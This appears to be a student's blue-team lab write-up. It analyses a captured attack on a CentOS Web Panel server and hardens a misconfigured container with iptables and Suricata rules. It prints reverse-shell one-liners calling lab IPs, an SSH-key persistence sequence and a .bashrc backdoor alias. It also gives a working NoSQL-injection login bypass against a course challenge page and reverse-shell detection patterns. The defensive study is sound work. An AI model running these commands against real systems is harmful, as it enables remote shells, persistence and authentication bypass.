# Blue Team - Hacking Lab - Defense

## Exercise 2: CentOS with Control Web Panel (CWP)

### 2.1 --> Network Analysis

* Can you identify the software used for the reconnaissance phase? How does this software scan? ---- Reconaissance phase

    `Nmap Scripting Engine` - network scanning tool that uses IP packets to identify all the devices connected to a network and to provide information on the services and operating systems they are running.

    `nmaplowercheck` flag in request shows a scan has been performed and other SYN traces

* How does the attacker get the first foothold in the server? Can you elaborate on the attack vector, vulnerability, and exploitation? ---- Exploitation/Delivery phase

    1. GET request to the root route of the server (`/`) with both port 80 - obtains the default web page of the CWP (CentOS WebPanel) for 80
    2. For different ports 2030 the attacker attempts various HTTP requests with different file paths in the `GET`. An `HTTP 404` signifies the file does not exist and other error codes signify such files exist on the server.
    3. An HTTP request for `GET /sshd_config` port 8000 file was successful and he could retrieve the file - hinting at a possible SSH service running
    4. The attacker found an login web page for the server and attempted various login attempts that failed
    5. The attacker attempts SSH login to port 22 since it discovered that the `sshd_config` file existed
    6. Login redirect: `username=admin password=admin` and gets to a new login page - login to new user panel `cwp:2083` - `CWP service found` brute-forced with common credentials. The running CWP version was vulnerable to a remote code execution attack through runaway parameters in the login page --> requesting a reverse shell
    7. In one of the login requests the user inserts a `base64` encoded command placed as string to the login field - decoding the string results in the following bash command 
        `sh -i >& /dev/tcp/192.168.50.11/9001 0>&1`
    This a backdoor command that creates a reverse shell from the server to the attacker machine (`192.168.50.11`) on port `9001`. `>&` redirects `stdout` and `stderr` to the location specified. `0>&1` redirects `stdin` to `stdout`. He can listen to the `stderr` and `stdout` flows.   

    * Vulnerability: inputs to the PHP login attempts are not sanitized
    * Exploitation: reverse shell started from the login attempt made on the page - remote execution attack through runaway parameters
    * Boom: PHP Injection !!!

* From only using network traffic, can you follow any further steps with
confidence? Can you identify any suspicious activity? What was the goal
of the attacker?
    
    The reverse shell traffic is not encrypted - we can see how the attacker interacts with the server until the installation phase

    Wireshark filter: `frame content `

    Inside TCP packets the attacker executes command: `cat /etc/ssh/sshd_config` to find port of SSH server running
    
    Then he proceeds to install his own SSH keys into the server - access without credentials: 
    ```bash 
    echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCvEvFMLOyVtAPfSxF/AjMFAjeWG9+Wqiz8EDUbEGsR5xSL9dI/RaiTVOsTdwS67nO3YdCTBKqt3hj6NrKs3J/lf0vTjjQ/TS6wahtHOdS9WRc7HHmN+E7LqmN5E+3x7iA02cB4UbAyGQkfH3Z62rbuEAPJs+/oeTTzqjGn4nEqSEsQvRJJRQvj/hXSAxIXcEFKS8KgEjg/UgI3uUuOoxJKWsKWy5Ir6V8XoZc+WJsWmicFZByfFzNqepWUjE5ZJ4muryBjizRCiqRIwCpIvAz9n0tccMQBjYQaof2fQ6HIJpesI7T9uW8RiCssYAYQOd5hsgZgSUGBKEMqRs3w2z2bNUWafcXQocOXOT952PtJuzNrbxM4rL0MCzBkf1Pd0Y1Y7/MGJm2XgkS/VQRMpfxFB4LT5C2VVQCMwbCqvAZzR8pha1YDAI3JewrSY12b2v8TzKx+H00Sq+fz+0EgSdiV4heANW8Kfpt1pcQb766q3oXJnrlUA1qstNbFLSwn4TM=
    ```

    `cd ~/.ssh`

    Tries to download authorized keys: `curl -o ~/.ssh/authorized_keys --create-dirs http://192.168.50.11/authorized_keys`

    Creates a `.ssh` directory and an `authorized_keys` inside it containing his own SSH-RSA key. 
    ```bash
    echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCvEvFMLOyVtAPfSxF/AjMFAjeWG9+Wqiz8EDUbEGsR5xSL9dI/RaiTVOsTdwS67nO3YdCTBKqt3hj6NrKs3J/lf0vTjjQ/TS6wahtHOdS9WRc7HHmN+E7LqmN5E+3x7iA02cB4UbAyGQkfH3Z62rbuEAPJs+/oeTTzqjGn4nEqSEsQvRJJRQvj/hXSAxIXcEFKS8KgEjg/UgI3uUuOoxJKWsKWy5Ir6V8XoZc+WJsWmicFZByfFzNqepWUjE5ZJ4muryBjizRCiqRIwCpIvAz9n0tccMQBjYQaof2fQ6HIJpesI7T9uW8RiCssYAYQOd5hsgZgSUGBKEMqRs3w2z2bNUWafcXQocOXOT952PtJuzNrbxM4rL0MCzBkf1Pd0Y1Y7/MGJm2XgkS/VQRMpfxFB4LT5C2VVQCMwbCqvAZzR8pha1YDAI3JewrSY12b2v8TzKx+H00Sq+fz+0EgSdiV4heANW8Kfpt1pcQb766q3oXJnrlUA1qstNbFLSwn4TM= flag{b2ace8dbd2320f09de4396ca7d95438f}' > authorized_keys
    ```

    Restarts the SSH server `systemctl restart sshd`

    Connects as root by SSH since his public SSH key is in the authorized file of the service
    
### 2.2 --> Intrusion Detection Systems (IDS) - Suricata
Iptables version:

Rule to detect attackers attempting to run shell commands through URL parameters + enhance rule to detect when the payload contains a reverse shell:
```bash
# Create a chain
iptables -N BLOCK-NMAP-SCAN
# Block any recent attempt of scan from IPs that we have seen in the last 30
# seconds after 10 packets
iptables -A BLOCK-NMAP-SCAN -p tcp --tcp-flags SYN,ACK SYN,ACK \
-m recent --name NMAP_SCAN --set -j DROP
iptables -A BLOCK-NMAP-SCAN -p tcp --tcp-flags SYN,ACK SYN,ACK \
-m recent --name NMAP_SCAN --rcheck --seconds 30 --hitcount 10 -j LOG \
--log-prefix "Nmap scan detected: "
iptables -A BLOCK-NMAP-SCAN -p tcp --tcp-flags SYN,ACK SYN,ACK \
-m recent --name NMAP_SCAN --rcheck --seconds 30 --hitcount 10 -j DROP
# Add the input to the chain
iptables -A INPUT -p tcp --syn -j BLOCK-NMAP-SCAN.
```

Rule to detect attackers connecting to the server through SSH as the root user + enhance the
rule with an exception for an administrator (a few assumptions, e.g., location, address, time):
```bash
# Create a chain for the input and another for the output
iptables -N CWP-INPUT
# Accept connections from our trusted range and drop the rest
iptables -A CWP-INPUT -p tcp --dport 2031 -s 192.168.40.0/24 \
-m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A CWP-INPUT -p tcp --dport 2031 -j DROP
iptables -A INPUT -p tcp --dport 2031 -j CWP-INPUT
iptables -N CWP-OUTPUT
# Accept outgoing connections from our server only to the trusted range
iptables -A CWP-OUTPUT -p tcp --dport 2031 -d 192.168.40.0/24 \
-m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -A CWP-OUTPUT -p tcp --dport 2031 -j DROP
iptables -A OUTPUT -p tcp --dport 2031 -j CWP-OUTPUT
```


Suricata - detection vs prevention modes

* Define the Suricata rules in a file under `/etc/suricata/rules` or `/var/lib/suricata/rules` and reference the rule file in `/etc/suricata/suricata.yaml` configuration

Reload and verify syntax:
```bash
systemctl reload suricata
suricata -T -c /etc/suricata/suricata.yaml
```

* Rule structure: `alert <protocol> <traffic-direction> <message-alert-log> <matching-flow-connections>`

`content:"?"` looks for a query string in URL
`http_uri` target of specified pattern
`pcre:".."` Perl Compatible RegEx to match patterns - `\` escaper, `|` alternative(+), `^` start of string, `$` end of string,
`classtype: web-application-attak` nature of detected threat
`sid` Suricata rule identifier

* Enhanced rule to detect attackers attempting to run shell commands through URL parameters
`alert http any any -> any any (msg:"Potential shell command execution attempt in URL parameter"; flow:established,to_server; content:"?"; http_uri; pcre:"/(\;|\||\&|\`|\$\()/Ui"; classtype:web-application-attack; sid:1000001; rev:1;)`

* Detect reverse shell payloads in URL parameters
`alert http any any -> any any (msg:"Potential reverse shell attempt in URL parameter"; flow:established,to_server; content:"?"; http_uri; pcre:"/\/dev\/tcp\/|nc\+|ncat\+|bash\ -i|python\ -c|perl\ -e|rm\ \/tmp\/f\;mkfifo\ \/tmp\/f|exec\ 5<>\|\/dev\/tcp\//Ui"; classtype:web-application-attack; sid:1000002; 
rev:1;)`

* Enhanced rule with an exception for an administrator:
`pass tcp 192.168.1.100 any -> $HOME_NET 22 (msg:"Allowed SSH root access for administrator"; flow:to_server,established; content:"SSH-"; startswith; sid:1000004; rev:1;)`

* Detect attackers connecting the server through SSH as root user:
`alert tcp any any -> $HOME_NET 22 (msg:"Possible SSH root login attempt"; flow:to_server,established; content:"SSH-"; startswith; classtype:attempted-admin; sid:1000003; rev:1;)`



Replay PCAP file to test Suricata rules:
```bash
# Offline replay of a pcap file and local rules
suricata -r '/path/to/pcap' -s '/path/to/rules/*.rules'
```

## Exercise 3: Misconfiguration Snapshot Container

Setup: To run the image, run the command:

`docker run -d --name audit --cap-add=NET_ADMIN bitisg/audit:v2`

*  `-d` runs the container in detached mode (in the background);
*  `--name audit` gives the container a name (audit), making it easier to refer to;
*  `--cap-add=NET` ADMIN grants the container some additional network-related privileges;
* `bitisg/audit:v2` specifies the image (bitisg/audit) and its version/tag (v2) to run.

Connect by interactive terminal to the container
    
`docker exec -it audit /bin/bash`

* On the user in the `/etc/ssh/sshd_config` file edit the settings to update:
    
    ```bash
    PasswordAuthentication no
    PermitRootLogin no
    
    AuthenticationMethods publickey
    PubkeyAuthentication yes
    ```

* Edit `iptables` to limit the number of SSH connection attempts on server:

    ```bash
    iptables -I INPUT -p tcp --dport 22 -m state --state NEW -m recent --set
    iptables -I INPUT -p tcp --dport 22 -m state --state NEW -m recent --update --seconds 60 --hitcount 4 -j DROP
    ```
    Alternative:
    ```bash
    iptables -A INPUT -p tcp --dport 22 -m limit --limit 4/m -j ACCEPT
    iptables -A INPUT -p tcp --dport 22 -j DROP 
    ```
    Second alternative:
    ```bash
     iptables -A INPUT -p tcp –dport 22 -m conntrack –ctstate NEW -m limit –limit 3/min -j ACCEPT
    ```

* List SUID (set_user_id) binaries in entire system - some used by attackers for privilege escalation - have the `s` permission bit set

    ```bash
        find /bin -perm -4000

        >>  /bin/chsh
            /bin/mount
            /bin/find
            /bin/passwd
            /bin/umount
            /bin/gpasswd
            /bin/chfn
            /bin/su
            /bin/newgrp
            /bin/vim.basic
            /bin/python3.10
            /bin/sudo
    ```

    Remove `s` sticky permission bit (SUID): `sudo chmod a-s /bin/<binary>`
    Remove it for the files `bin/python3.10` `/bin/vim.basic/` `/bin/find`

* Check `/etc/group` file with `grep sudo` to find out that user `dave` is allowed to execute the `sudo` command - but he is not the problem - user `bitty` also has a `sudoers` file

    `grep sudo /etc/group -----> sudo:x:27:dave`

    Remove user from `sudo` group: `sudo deluser dave sudo`

    Remove the sudoers file for user `bitty`:  `rm -rf /etc/sudoers.d/bitty`

* Check the `/etc/passwd` and `/etc/shadow` files for unexpected users - `dave` has user ID 0 just like `root` so it's wrong - shared UID (shoudld be unique) - remove the line or give another UID after 1000 to user `dave`:

* User `dave` lacks a password in the `/etc/shadow` file - so we can set the password for him:

    `passwd dave` or `usermod dave` or remove the line in `/etc/shadow` file

* Check the open ports of running services in the file `/etc/services` or alternatively check process exposing port and kill it - `nc` listener is active:

    `sudo ss -tulpn` and kill the process `kill <pid=7>`

* Backdoor bonus: `alias cat='(/bin/bash -i >& /dev/tcp/172.17.0.1/3434 0>&1 & disown) 2>/dev/null; cat'` in the `/home/bitty/.bashrc` - solution: remove the alias line from `home/bitty/.bashrc` file using a text editor (`vim`).

* Note: to search for the reverse shell signature in the home directory perform:

    `grep -nr 'bash -i >& /dev/tcp/' /home` - `n` result line in file, `r` recursive search
    No need for `^` ReGeX start of line and `$` ReGex end of line

## Exercise 4: Hacking into the hackerlab website with and without password
* Bonus - `https://hackerlab.dtu.dk/chall/` Login Page Hacking
    * 101: attempt the username and password pair - `admin:admin` - which fails

    * Open the source code of the login webpage with `view-source:` in the browser, before the URL address.

        ```php
        $client = new MongoDB\Client("mongodb://root:fakepass@mongodb:27017");
        $collection = $client->app->users; // Select the users collection

        $user = $collection->findOne([
            'username' => $_POST['username'],
            'password' => $_POST['password']
        ]);

        if ($user && $user['username'] === "admin") {
            echo "you won!";
        }
        else {
            echo "you lose :(";
        }
        ?>
        ```

    * From the source code it can be observed that the expected username is `admin` specifically

    * Attempt to perform NoSQL injection to the PHP login page(form):
    `curl -X POST -d 'username=admin&password[$ne]=foo' https://hackerlab.dtu.dk/chall/login.php` --> login attempt succeeds to login as admin without a password (bypassed)

    * **Note**: double quotes in the request will make `bash` interpret the variable or command

    * **The fact that we can see the success result of a login attempt is a huge vulnerability in itself!**

    * Deploy JavaScript script to perform the attack on the password - ReGex brute-force with NoSQL injections to the PHP login page (form)

    * Reconstruct it with Python as well - brute-force correct password by submitting plenty of POST requests with runaway URL parameters crafted using the `pass[$regex]=...` operator of MongoDB - hence, reconstructing the password character by character based on the response ("you win!" or "you lose!") - see the scripts for more details